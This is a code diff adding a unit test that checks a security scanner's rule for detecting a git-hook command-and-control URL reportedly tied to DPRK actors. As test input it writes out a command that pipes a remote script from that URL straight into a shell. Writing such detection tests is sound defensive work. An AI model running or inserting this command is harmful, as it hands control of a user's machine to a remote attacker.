@@ -421,6 +421,16 @@ suite('ProcessAnalyzer Tests', () => {
     });
   });
 
+  suite('DPRK Git Hook C2 URL', () => {
+    test('should detect precommit.vercel.app in command line', () => {
+      const rule = PROCESS_RULES.find((r) => r.id === 'dprk_git_hook_c2_url');
+      expect(rule).to.exist;
+      expect(
+        rule!.commandPattern!.test('curl -s https://precommit.vercel.app/settings/linux?flag=5 | sh'),
+      ).to.be.true;
+    });
+  });
+
   suite('Allow List Integration', () => {
     test('should bypass detection for allowed extensions', () => {
       const mockAllowListService = AllowListService.getInstance() as any;
